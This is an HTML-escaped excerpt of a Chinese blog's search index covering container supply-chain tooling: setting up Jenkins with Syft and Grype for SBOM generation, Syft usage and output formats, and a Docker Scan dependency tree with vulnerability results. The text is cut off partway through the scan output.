$USER\ndeploy jenkins via dockerdocker run -u root -d --name jenkins --rm -p 8080:8080 -p 50000:50000 -v &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock -v &#x2F;tmp&#x2F;jenkins-data:&#x2F;var&#x2F;jenkins_home jenkinsci&#x2F;blueocean\ninstall syft &amp; grype[root@tvy-base-worker-02 ~]# docker exec 1c5a bash -c &#39;curl -sSfL https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;anchore&#x2F;syft&#x2F;main&#x2F;install.sh | sh -s -- -b &#x2F;usr&#x2F;local&#x2F;bin&#39;\n[root@tvy-base-worker-02 ~]# docker exec 1c5a bash -c &#39;curl -sSfL https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;anchore&#x2F;grype&#x2F;main&#x2F;install.sh | sh -s -- -b &#x2F;usr&#x2F;local&#x2F;bin&#39;\nGenerating SBOM\nDefinition – Pipeline script from SCM\nSCM – Git\nRepository URL – https://github.com/pvnovarese/syft-sbom-demo (although you can use any GitHub repository for this demo).\n\npublish sbom to dependency-trackuse format CycloneDX 1.4 XML publish DT, just like docker sbom![[docker镜像安全的检查#Docker SBOM]]\n参考\n文档give-jenkins-a-software-bill-of-materials-with-syft&#x2F;\nDEMOjenkins-syft-demo\n\n0x06使用说明Generating SBOMTo generate an SBOM for a container image:\nsyft &lt;image&gt;\n# 上面的输出只包括在容器中可见的软件(即图像的压缩表示)。为了在 SBOM 中包含来自所有图像层的软件，不管它在最终图像中是否存在，添加参数如下\nsyft &lt;image&gt; --scope all-layers\nSyft 对不同来源生产SBOM\n# catalog a container image archive (from the result of &#96;docker image save ...&#96;, &#96;podman save ...&#96;, or &#96;skopeo copy&#96; commands)\nsyft path&#x2F;to&#x2F;image.tar\n# catalog a directory\nsyft path&#x2F;to&#x2F;dir\nSources can be explicitly provided with a scheme:\ndocker:yourrepo&#x2F;yourimage:tag            use images from the Docker daemon\npodman:yourrepo&#x2F;yourimage:tag            use images from the Podman daemon\ndocker-archive:path&#x2F;to&#x2F;yourimage.tar     use a tarball from disk for archives created from &quot;docker save&quot;\noci-archive:path&#x2F;to&#x2F;yourimage.tar        use a tarball from disk for OCI archives (from Skopeo or otherwise)\noci-dir:path&#x2F;to&#x2F;yourimage                read directly from a path on disk for OCI layout directories (from Skopeo or otherwise)\nsingularity:path&#x2F;to&#x2F;yourimage.sif        read directly from a Singularity Image Format (SIF) container on disk\ndir:path&#x2F;to&#x2F;yourproject                  read directly from a path on disk (any directory)\nfile:path&#x2F;to&#x2F;yourproject&#x2F;file            read directly from a path on disk (any single file)\nregistry:yourrepo&#x2F;yourimage:tag          pull image directly from a registry (no container runtime required)\noutput formatssyft &lt;image&gt; -o &lt;format&gt;\n支持的格式\n\njson: Use this to get as much information out of Syft as possible!\ntext: A row-oriented, human-and-machine-friendly output.\ncyclonedx-xml: A XML report conforming to the CycloneDX 1.4 specification.\ncyclonedx-json: A JSON report conforming to the CycloneDX 1.4 specification.\nspdx-tag-value: A tag-value formatted report conforming to the SPDX 2.2 specification.\nspdx-json: A JSON report conforming to the SPDX 2.2 JSON Schema.\ngithub: A JSON report conforming to GitHub’s dependency snapshot format.\ntable: A columnar summary (default).\ntemplate: Lets the user specify the output format. See “Using templates” below.\n\nPrivate Registry AuthenticationLocal Docker Credentials\ndocker run -v .&#x2F;config.json:&#x2F;config&#x2F;config.json -e &quot;DOCKER_CONFIG&#x3D;&#x2F;config&quot; anchore&#x2F;syft:latest  &lt;private_image&gt;\nDocker Credentials in Kubernetes\ncreat secret# secret.yaml\n\napiVersion: v1\nkind: Secret\nmetadata:\n  name: registry-config\n  namespace: syft\ndata:\n  config.json: &lt;base64 encoded config.json&gt;\ncreat pod apiVersion: v1\nkind: Pod\nmetadata:\n  name: syft-k8s-usage\nspec:\n  containers:\n    - image: anchore&#x2F;syft:latest\n      name: syft-private-registry-demo\n      env:\n        - name: DOCKER_CONFIG\n          value: &#x2F;config\n      volumeMounts:\n      - mountPath: &#x2F;config\n        name: registry-config\n        readOnly: true\n      args:\n        - &lt;private_image&gt;\n  volumes:\n  - name: registry-config\n    secret:\n      secretName: registry-config\nThe user can now run kubectl logs syft-private-registry-demo. The logs should show the Syft analysis for the &lt;private_image&gt; provided in the pod configuration.\n\n可信镜像略（支持，但尚属于试验阶段）\n0x07应用场景\n单一镜像安全扫描，经过安全扫描的镜像作为可信镜像\n镜像生成软件供应链清单\n集成到CI&#x2F;CD中梳理容器镜像中的资产信息（包括应用程序的二进制文件以及程序的执行环境和依赖。）：软件（操作系统包管理器如yum、apt和应用程序包管理器maven）版本、漏洞、最新版、风险值等。\n\n","slug":"syft","date":"2022-08-31T09:44:00.000Z","categories_index":"软件供应链安全","tags_index":"SCA,软件供应链安全,镜像依赖分析,docker-SBOM,容器镜像安全","author_index":"Moses"},{"id":"e9d7711be30d2abb5d40d409afb44a29","title":"Docker镜像安全检查","content":"docker镜像安全的检查官方工具Docker ScanVulnerability scanning for Docker local images | Docker Documentation\ninstall\nubuntuapt-get update &amp;&amp; apt-get install docker-scan-plugin\ncentosyum install docker-scan-plugin\nmacDownload and install the latest version of Docker Desktop\n\nPrerequisites\nDocker Desktop\nsign into Docker Hub\nlogin Snky account\n\n\nUsage\n\n\nOption\nDescription\n\n\n\n–accept-license\nAccept the license agreement of the third-party scanning provider\n\n\n–dependency-tree\nDisplay the dependency tree of the image along with scan results\n\n\n–exclude-base\nExclude the base image during scanning. This option requires the –file option to be set\n\n\n-f, –file string\nSpecify the location of the Dockerfile associated with the image. This option displays a detailed scan result\n\n\n–json\nDisplay the result of the scan in JSON format\n\n\n–login\nLog into Snyk using an optional token (using the flag –token), or by using a web-based token\n\n\n–reject-license\nReject the license agreement of the third-party scanning provider\n\n\n–severity string\nOnly report vulnerabilities of provided level or higher (low, medium, high)\n\n\n–token string\nUse the authentication token to log into the third-party scanning provider\n\n\n–version\nDisplay the Docker Scan plugin version\n\n\n示例\n扫描依赖树并保存成JSON文件✘ xfxj01@moses  ~&#x2F;Downloads&#x2F;swagger-ui-chrome   master  docker scan --json --dependency-tree pikachu:latest &gt; &#x2F;Users&#x2F;xfxj01&#x2F;Downloads&#x2F;pikachu.json\n xfxj01@moses  ~&#x2F;Downloads&#x2F;PR&#x2F;deepflow-dashboards   main  docker scan --dependency-tree sspringett&#x2F;nvdmirror:latest\ndocker-image|sspringett&#x2F;nvdmirror @ latest\n   ├─ .httpd-so-deps @ 20220613.233641\n   │  ├─ apr-util&#x2F;apr-util @ 1.6.1-r12\n   │  ├─ apr&#x2F;apr @ 1.7.0-r2\n   │  ├─ brotli&#x2F;brotli-libs @ 1.0.9-r6\n   │  ├─ curl&#x2F;libcurl @ 7.83.1-r1\n   │  ├─ jansson&#x2F;jansson @ 2.14-r0\n   │  ├─ libxml2&#x2F;libxml2 @ 2.9.14-r0\n   │  ├─ lua5.1&#x2F;lua5.1-libs @ 5.1.5-r11\n   │  ├─ nghttp2&#x2F;nghttp2-libs @ 1.47.0-r0\n   │  ├─ openldap&#x2F;libldap @ 2.6.2-r0\n   │  ├─ openssl&#x2F;libcrypto1.1 @ 1.1.1o-r0\n   │  ├─ openssl&#x2F;libssl1.1 @ 1.1.1o-r0\n   │  ├─ pcre&#x2F;pcre @ 8.45-r2\n   │  └─ zlib&#x2F;zlib @ 1.2.12-r1\n   ├─ alpine-baselayout&#x2F;alpine-baselayout @ 3.2.0-r20\n   ├─ alpine-baselayout&#x2F;alpine-baselayout-data @ 3.2.0-r20\n   │  └─ alpine-baselayout&#x2F;alpine-baselayout @ 3.2.0-r20\n   │     └─ busybox&#x2F;busybox @ 1.35.0-r13\n   ├─ alpine-keys&#x2F;alpine-keys @ 2.4-r1\n   ├─ alsa-lib&#x2F;alsa-lib @ 1.2.6.1-r0\n   ├─ apk-tools&#x2F;apk-tools @ 2.12.9-r3\n   │  ├─ ca-certificates&#x2F;ca-certificates-bundle @ 20211220-r0\n   │  ├─ openssl&#x2F;libcrypto1.1 @ 1.1.1o-r0\n   │  ├─ openssl&#x2F;libssl1.1 @ 1.1.1o-r0\n   │  └─ zlib&#x2F;zlib @ 1.2.12-r1\n   ├─ apr-util&#x2F;apr-util @ 1.6.1-r12\n   │  ├─ apr&#x2F;apr @ 1.7.0-r2\n   │  ├─ expat&#x2F;expat @ 2.4.8-r0\n   │  └─ openssl&#x2F;libcrypto1.1 @ 1.1.1o-r0\n   ├─ apr-util&#x2F;apr-util-ldap @ 1.6.1-r12\n   │  └─ openldap&#x2F;libldap @ 2.6.2-r0\n   ├─ apr&#x2F;apr @ 1.7.0-r2\n   │  └─ util-linux&#x2F;libuuid @ 2.38-r1\n   ├─ brotli&#x2F;brotli-libs @ 1.0.9-r6\n   ├─ busybox&#x2F;busybox @ 1.35.0-r13\n   ├─ busybox&#x2F;ssl_client @ 1.35.0-r13\n   │  ├─ openssl&#x2F;libcrypto1.1 @ 1.1.1o-r0\n   │  └─ openssl&#x2F;libssl1.1 @ 1.1.1o-r0\n   ├─ bzip2&#x2F;libbz2 @ 1.0.8-r1\n   ├─ ca-certificates&#x2F;ca-certificates @ 20211220-r0\n   │  ├─ busybox&#x2F;busybox @ 1.35.0-r13\n   │  └─ openssl&#x2F;libcrypto1.1 @ 1.1.1o-r0\n   ├─ ca-certificates&#x2F;ca-certificates-bundle @ 20211220-r0\n   ├─ curl&#x2F;libcurl @ 7.83.1-r1\n   │  ├─ brotli&#x2F;brotli-libs @ 1.0.9-r6\n   │  ├─ ca-certificates&#x2F;ca-certificates @ 20211220-r0\n   │  ├─ nghttp2&#x2F;nghttp2-libs @ 1.47.0-r0\n   │  ├─ openssl&#x2F;libcrypto1.1 @ 1.1.1o-r0\n   │  ├─ openssl&#x2F;libssl1.1 @ 1.1.1o-r0\n   │  └─ zlib&#x2F;zlib @ 1.2.12-r1\n   ├─ cyrus-sasl&#x2F;libsasl @ 2.1.28-r0\n   │  └─ gdbm&#x2F;gdbm @ 1.23-r0\n   ├─ dcron&#x2F;dcron @ 4.5-r7\n   ├─ e2fsprogs&#x2F;libcom_err @ 1.46.5-r0\n   ├─ encodings&#x2F;encodings @ 1.0.5-r0\n   ├─ expat&#x2F;expat @ 2.4.8-r0\n   ├─ fontconfig&#x2F;fontconfig @ 2.14.0-r0\n   │  ├─ busybox&#x2F;busybox @ 1.35.0-r13\n   │  ├─ expat&#x2F;expat @ 2.4.8-r0\n   │  └─ freetype&#x2F;freetype @ 2.12.1-r0\n   ├─ freetype&#x2F;freetype @ 2.12.1-r0\n   │  ├─ brotli&#x2F;brotli-libs @ 1.0.9-r6\n   │  ├─ bzip2&#x2F;libbz2 @ 1.0.8-r1\n   │  ├─ libpng&#x2F;libpng @ 1.6.37-r1\n   │  └─ zlib&#x2F;zlib @ 1.2.12-r1\n   ├─ gcc&#x2F;libgcc @ 11.2.1_git20220219-r2\n   │  └─ gcc&#x2F;libstdc++ @ 11.2.1_git20220219-r2\n   ├─ gcc&#x2F;libstdc++ @ 11.2.1_git20220219-r2\n   ├─ gdbm&#x2F;gdbm @ 1.23-r0\n   ├─ giflib&#x2F;giflib @ 5.2.1-r0\n   ├─ jansson&#x2F;jansson @ 2.14-r0\n   ├─ java-cacerts&#x2F;java-cacerts @ 1.0-r1\n   │  ├─ busybox&#x2F;busybox @ 1.35.0-r13\n   │  ├─ ca-certificates&#x2F;ca-certificates @ 20211220-r0\n   │  ├─ p11-kit&#x2F;p11-kit @ 0.24.1-r0\n   │  └─ p11-kit&#x2F;p11-kit-trust @ 0.24.1-r0\n   ├─ java-common&#x2F;java-common @ 0.5-r0\n   │  └─ busybox&#x2F;busybox @ 1.35.0-r13\n   ├─ keyutils&#x2F;keyutils-libs @ 1.6.3-r1\n   ├─ krb5-conf&#x2F;krb5-conf @ 1.0-r2\n   │  └─ krb5&#x2F;krb5-libs @ 1.19.3-r0\n   │     ├─ e2fsprogs&#x2F;libcom_err @ 1.46.5-r0\n   │     ├─ keyutils&#x2F;keyutils-libs @ 1.6.3-r1\n   │     ├─ libverto&#x2F;libverto @ 0.3.2-r0\n   │     ├─ openssl&#x2F;libcrypto1.1 @ 1.1.1o-r0\n   │     └─ openssl&#x2F;libssl1.1 @ 1.1.1o-r0\n   ├─ krb5&#x2F;krb5-libs @ 1.19.3-r0\n   ├─ lcms2&#x2F;lcms2 @ 2.13.1-r0\n   ├─ libc-dev&#x2F;libc-utils @ 0.7.2-r3\n   │  └─ musl&#x2F;musl-utils @ 1.2.3-r0\n   ├─ libffi&#x2F;libffi @ 3.4.2-r1\n   ├─ libfontenc&#x2F;libfontenc @ 1.1.4-r0\n   │  └─ zlib&#x2F;zlib @ 1.2.12-r1\n   ├─ libjpeg-turbo&#x2F;libjpeg-turbo @ 2.1.3-r1\n   ├─ libpng&#x2F;libpng @ 1.6.37-r1\n   │  └─ zlib&#x2F;zlib @ 1.2.12-r1\n   ├─ libtasn1&#x2F;libtasn1 @ 4.18.0-r0\n   ├─ libverto&#x2F;libverto @ 0.3.2-r0\n   ├─ libx11&#x2F;libx11 @ 1.8-r0\n   │  └─ libxcb&#x2F;libxcb @ 1.15-r0\n   ├─ libxau&#x2F;libxau @ 1.0.9-r0\n   ├─ libxcb&#x2F;libxcb @ 1.15-r0\n   │  ├─ libxau&#x2F;libxau @ 1.0.9-r0\n   │  └─ libxdmcp&#x2F;libxdmcp @ 1.1.3-r0\n   ├─ libxcomposite&#x2F;libxcomposite @ 0.4.5-r0\n   │  └─ libx11&#x2F;libx11 @ 1.8-r0\n   ├─ libxdmcp&#x2F;libxdmcp @ 1.1.3-r0\n   ├─ libxext&#x2F;libxext @ 1.3.4-r0\n   │  └─ libx11&#x2F;libx11 @ 1.8-r0\n   ├─ libxi&#x2F;libxi @ 1.8-r0\n   │  ├─ libx11&#x2F;libx11 @ 1.8-r0\n   │  └─ libxext&#x2F;libxext @ 1.3.4-r0\n   ├─ libxml2&#x2F;libxml2 @ 2.9.14-r0\n   │  ├─ xz&#x2F;xz-libs @ 5.2.5-r1\n   │  └─ zlib&#x2F;zlib @ 1.2.12-r1\n   ├─ libxrender&#x2F;libxrender @ 0.9.10-r3\n   │  └─ libx11&#x2F;libx11 @ 1.8-r0\n   ├─ libxtst&#x2F;libxtst @ 1.2.3-r3\n   │  ├─ libx11&#x2F;libx11 @ 1.8-r0\n   │  └─ libxext&#x2F;libxext @ 1.3.4-r0\n   ├─ lksctp-tools&#x2F;liblksctp @ 1.0.19-r0\n   ├─ lua5.1&#x2F;lua5.1-libs @ 5.1.5-r11\n   ├─ meta-common-packages @ meta\n   │  └─ musl&#x2F;musl @ 1.2.3-r0\n   ├─ mkfontscale&#x2F;mkfontscale @ 1.2.2-r0\n   │  ├─ busybox&#x2F;busybox @ 1.35.0-r13\n   │  ├─ freetype&#x2F;freetype @ 2.12.1-r0\n   │  ├─ libfontenc&#x2F;libfontenc @ 1.1.4-r0\n   │  └─ zlib&#x2F;zlib @ 1.2.12-r1\n   ├─ mpdecimal&#x2F;mpdecimal @ 2.5.1-r1\n   │  ├─ gcc&#x2F;libgcc @ 11.2.1_git20220219-r2\n   │  └─ gcc&#x2F;libstdc++ @ 11.2.1_git20220219-r2\n   ├─ musl&#x2F;musl-utils @ 1.2.3-r0\n   │  └─ pax-utils&#x2F;scanelf @ 1.3.4-r0\n   ├─ ncurses&#x2F;ncurses-libs @ 6.3_p20220521-r0\n   │  └─ ncurses&#x2F;ncurses-terminfo-base @ 6.3_p20220521-r0\n   ├─ ncurses&#x2F;ncurses-terminfo-base @ 6.3_p20220521-r0\n   ├─ nghttp2&#x2F;nghttp2-libs @ 1.47.0-r0\n   ├─ nspr&#x2F;nspr @ 4.33-r0\n   ├─ nss&#x2F;nss @ 3.78.1-r0\n   │  ├─ nspr&#x2F;nspr @ 4.33-r0\n   │  └─ sqlite&#x2F;sqlite-libs @ 3.38.5-r0\n   ├─ openjdk8&#x2F;openjdk8-jre @ 8.322.06-r0\n   │  ├─ alsa-lib&#x2F;alsa-lib @ 1.2.6.1-r0\n   │  ├─ freetype&#x2F;freetype @ 2.12.1-r0\n   │  ├─ gcc&#x2F;libgcc @ 11.2.1_git20220219-r2\n   │  ├─ gcc&#x2F;libstdc++ @ 11.2.1_git20220219-r2\n   │  ├─ giflib&#x2F;giflib @ 5.2.1-r0\n   │  ├─ libjpeg-turbo&#x2F;libjpeg-turbo @ 2.1.3-r1\n   │  ├─ libpng&#x2F;libpng @ 1.6.37-r1\n   │  ├─ libx11&#x2F;libx11 @ 1.8-r0\n   │  ├─ libxcomposite&#x2F;libxcomposite @ 0.4.5-r0\n   │  ├─ libxext&#x2F;libxext @ 1.3.4-r0\n   │  ├─ libxi&#x2F;libxi @ 1.8-r0\n   │  ├─ libxrender&#x2F;libxrender @ 0.9.10-r3\n   │  ├─ libxtst&#x2F;libxtst @ 1.2.3-r3\n   │  ├─ openjdk8&#x2F;openjdk8-jre-base @ 8.322.06-r0\n   │  └─ ttf-dejavu&#x2F;ttf-dejavu @ 2.37-r1\n   ├─ openjdk8&#x2F;openjdk8-jre-base @ 8.322.06-r0\n   │  ├─ gcc&#x2F;libstdc++ @ 11.2.1_git20220219-r2\n   │  ├─ java-cacerts&#x2F;java-cacerts @ 1.0-r1\n   │  ├─ java-common&#x2F;java-common @ 0.5-r0\n   │  ├─ krb5&#x2F;krb5-libs @ 1.19.3-r0\n   │  ├─ lcms2&#x2F;lcms2 @ 2.13.1-r0\n   │  ├─ libjpeg-turbo&#x2F;libjpeg-turbo @ 2.1.3-r1\n   │  ├─ lksctp-tools&#x2F;liblksctp @ 1.0.19-r0\n   │  ├─ nss&#x2F;nss @ 3.78.1-r0\n   │  ├─ openjdk8&#x2F;openjdk8-jre-lib @ 8.322.06-r0\n   │  ├─ pcsc-lite&#x2F;pcsc-lite-libs @ 1.9.6-r0\n   │  └─ zlib&#x2F;zlib @ 1.2.12-r1\n   ├─ openjdk8&#x2F;openjdk8-jre-lib @ 8.322.06-r0\n   ├─ openldap&#x2F;libldap @ 2.6.2-r0\n   │  ├─ cyrus-sasl&#x2F;libsasl @ 2.1.28-r0\n   │  ├─ openssl&#x2F;libcrypto1.1 @ 1.1.1o-r0\n   │  └─ openssl&#x2F;libssl1.1 @ 1.1.1o-r0\n   ├─ openssl&#x2F;libcrypto1.1 @ 1.1.1o-r0\n   ├─ openssl&#x2F;libssl1.1 @ 1.1.1o-r0\n   │  └─ openssl&#x2F;libcrypto1.1 @ 1.1.1o-r0\n   ├─ p11-kit&#x2F;p11-kit @ 0.24.1-r0\n   │  └─ libffi&#x2F;libffi @ 3.4.2-r1\n   ├─ p11-kit&#x2F;p11-kit-trust @ 0.24.1-r0\n   │  ├─ libtasn1&#x2F;libtasn1 @ 4.18.0-r0\n   │  └─ p11-kit&#x2F;p11-kit @ 0.24.1-r0\n   ├─ pax-utils&#x2F;scanelf @ 1.3.4-r0\n   ├─ pcre&#x2F;pcre @ 8.45-r2\n   ├─ pcsc-lite&#x2F;pcsc-lite-libs @ 1.9.6-r0\n   ├─ perl&#x2F;perl @ 5.34.1-r0\n   │  ├─ bzip2&#x2F;libbz2 @ 1.0.8-r1\n   │  └─ zlib&#x2F;zlib @ 1.2.12-r1\n   ├─ py3-appdirs&#x2F;py3-appdirs @ 1.4.4-r3\n   │  └─ python3&#x2F;python3 @ 3.10.4-r0\n   ├─ py3-more-itertools&#x2F;py3-more-itertools @ 8.13.0-r0\n   │  └─ python3&#x2F;python3 @ 3.10.4-r0\n   ├─ py3-ordered-set&#x2F;py3-ordered-set @ 4.0.2-r3\n   │  └─ python3&#x2F;python3 @ 3.10.4-r0\n   ├─ py3-packaging&#x2F;py3-packaging @ 21.3-r0\n   │  ├─ py3-parsing&#x2F;py3-parsing @ 2.4.7-r3\n   │  ├─ py3-six&#x2F;py3-six @ 1.16.0-r1\n   │  └─ python3&#x2F;python3 @ 3.10.4-r0\n   ├─ py3-parsing&#x2F;py3-parsing @ 2.4.7-r3\n   │  └─ python3&#x2F;python3 @ 3.10.4-r0\n   ├─ py3-setuptools&#x2F;py3-setuptools @ 59.4.0-r0\n   │  ├─ py3-appdirs&#x2F;py3-appdirs @ 1.4.4-r3\n   │  ├─ py3-more-itertools&#x2F;py3-more-itertools @ 8.13.0-r0\n   │  ├─ py3-ordered-set&#x2F;py3-ordered-set @ 4.0.2-r3\n   │  ├─ py3-packaging&#x2F;py3-packaging @ 21.3-r0\n   │  ├─ py3-parsing&#x2F;py3-parsing @ 2.4.7-r3\n   │  └─ python3&#x2F;python3 @ 3.10.4-r0\n   ├─ py3-six&#x2F;py3-six @ 1.16.0-r1\n   │  └─ python3&#x2F;python3 @ 3.10.4-r0\n   ├─ python3&#x2F;python3 @ 3.10.4-r0\n   │  ├─ bzip2&#x2F;libbz2 @ 1.0.8-r1\n   │  ├─ expat&#x2F;expat @ 2.4.8-r0\n   │  ├─ gdbm&#x2F;gdbm @ 1.23-r0\n   │  ├─ libffi&#x2F;libffi @ 3.4.2-r1\n   │  ├─ mpdecimal&#x2F;mpdecimal @ 2.5.1-r1\n   │  ├─ ncurses&#x2F;ncurses-libs @ 6.3_p20220521-r0\n   │  ├─ openssl&#x2F;libcrypto1.1 @ 1.1.1o-r0\n   │  ├─ openssl&#x2F;libssl1.1 @ 1.1.1o-r0\n   │  ├─ readline&#x2F;readline @ 8.1.2-r0\n   │  ├─ sqlite&#x2F;sqlite-libs @ 3.38.5-r0\n   │  ├─ xz&#x2F;xz-libs @ 5.2.5-r1\n   │  └─ zlib&#x2F;zlib @ 1.2.12-r1\n   ├─ readline&#x2F;readline @ 8.1.2-r0\n   │  └─ ncurses&#x2F;ncurses-libs @ 6.3_p20220521-r0\n   ├─ sqlite&#x2F;sqlite-libs @ 3.38.5-r0\n   ├─ supervisor&#x2F;supervisor @ 4.2.4-r0\n   │  ├─ py3-setuptools&#x2F;py3-setuptools @ 59.4.0-r0\n   │  └─ python3&#x2F;python3 @ 3.10.4-r0\n   ├─ ttf-dejavu&#x2F;ttf-dejavu @ 2.37-r1\n   │  ├─ encodings&#x2F;encodings @ 1.0.5-r0\n   │  ├─ fontconfig&#x2F;fontconfig @ 2.14.0-r0\n   │  └─ mkfontscale&#x2F;mkfontscale @ 1.2.2-r0\n   ├─ util-linux&#x2F;libuuid @ 2.38-r1\n   ├─ xz&#x2F;xz-libs @ 5.2.5-r1\n   └─ zlib&#x2F;zlib @ 1.2.12-r1\nsspringett&#x2F;nvdmirror:latest:&#x2F;usr&#x2F;local&#x2F;bin @\n   └─ us.springett:nist-data-mirror @ 1.6.1-SNAPSHOT\n\nTesting sspringett&#x2F;nvdmirror:latest...\n\n✗ Low severity vulnerability found in openjdk8&#x2F;openjdk8-jre-base\n  Description: CVE-2022-21443\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-OPENJDK8-2987667\n  Introduced through: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0, openjdk8&#x2F;openjdk8-jre@8.322.06-r0, openjdk8&#x2F;openjdk8-jre-lib@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0 &gt; openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0\n  and 2 more...\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 8.345.01-r0\n\n✗ Low severity vulnerability found in libxml2&#x2F;libxml2\n  Description: CVE-2022-3209\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-LIBXML2-2987456\n  Introduced through: libxml2&#x2F;libxml2@2.9.14-r0, .httpd-so-deps@20220613.233641\n  From: libxml2&#x2F;libxml2@2.9.14-r0\n  From: .httpd-so-deps@20220613.233641 &gt; libxml2&#x2F;libxml2@2.9.14-r0\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 2.9.14-r1\n\n✗ Medium severity vulnerability found in openssl&#x2F;libcrypto1.1\n  Description: Inadequate Encryption Strength\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-OPENSSL-2941806\n  Introduced through: openssl&#x2F;libcrypto1.1@1.1.1o-r0, apr-util&#x2F;apr-util@1.6.1-r12, curl&#x2F;libcurl@7.83.1-r1, openldap&#x2F;libldap@2.6.2-r0, openssl&#x2F;libssl1.1@1.1.1o-r0, .httpd-so-deps@20220613.233641, apk-tools&#x2F;apk-tools@2.12.9-r3, busybox&#x2F;ssl_client@1.35.0-r13, ca-certificates&#x2F;ca-certificates@20211220-r0, python3&#x2F;python3@3.10.4-r0, krb5-conf&#x2F;krb5-conf@1.0-r2\n  From: openssl&#x2F;libcrypto1.1@1.1.1o-r0\n  From: apr-util&#x2F;apr-util@1.6.1-r12 &gt; openssl&#x2F;libcrypto1.1@1.1.1o-r0\n  From: curl&#x2F;libcurl@7.83.1-r1 &gt; openssl&#x2F;libcrypto1.1@1.1.1o-r0\n  and 16 more...\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 1.1.1q-r0\n\n✗ Medium severity vulnerability found in openjdk8&#x2F;openjdk8-jre-base\n  Description: CVE-2022-21496\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-OPENJDK8-2987663\n  Introduced through: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0, openjdk8&#x2F;openjdk8-jre@8.322.06-r0, openjdk8&#x2F;openjdk8-jre-lib@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0 &gt; openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0\n  and 2 more...\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 8.345.01-r0\n\n✗ Medium severity vulnerability found in openjdk8&#x2F;openjdk8-jre-base\n  Description: CVE-2022-21540\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-OPENJDK8-2987665\n  Introduced through: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0, openjdk8&#x2F;openjdk8-jre@8.322.06-r0, openjdk8&#x2F;openjdk8-jre-lib@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0 &gt; openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0\n  and 2 more...\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 8.345.01-r0\n\n✗ Medium severity vulnerability found in openjdk8&#x2F;openjdk8-jre-base\n  Description: CVE-2022-21541\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-OPENJDK8-2987666\n  Introduced through: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0, openjdk8&#x2F;openjdk8-jre@8.322.06-r0, openjdk8&#x2F;openjdk8-jre-lib@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0 &gt; openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0\n  and 2 more...\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 8.345.01-r0\n\n✗ Medium severity vulnerability found in openjdk8&#x2F;openjdk8-jre-base\n  Description: CVE-2022-21434\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-OPENJDK8-2987668\n  Introduced through: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0, openjdk8&#x2F;openjdk8-jre@8.322.06-r0, openjdk8&#x2F;openjdk8-jre-lib@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0 &gt; openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0\n  and 2 more...\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 8.345.01-r0\n\n✗ Medium severity vulnerability found in openjdk8&#x2F;openjdk8-jre-base\n  Description: CVE-2022-21426\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-OPENJDK8-2987670\n  Introduced through: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0, openjdk8&#x2F;openjdk8-jre@8.322.06-r0, openjdk8&#x2F;openjdk8-jre-lib@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0 &gt; openjdk8&#x2F;openjdk8-jre-base@8.322.06-r0\n  From: openjdk8&#x2F;openjdk8-jre@8.322.06-r0\n  and 2 more...\n  Image layer: Introduced by your base image (httpd:2.4.54-alpine3.16)\n  Fixed in: 8.345.01-r0\n\n✗ Medium severity vulnerability found in curl&#x2F;libcurl\n  Description: Allocation of Resources Without Limits or Throttling\n  Info: https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-ALPINE316-CURL-2938008\n  Introduced through: curl&#x2F;libcurl@7.83.1-r1, .httpd-so-deps@20220613.233641\n  From: curl&#x2F;libcurl@7.83.1-r1\n  From: .httpd-so-deps@20220613.233641 &gt; 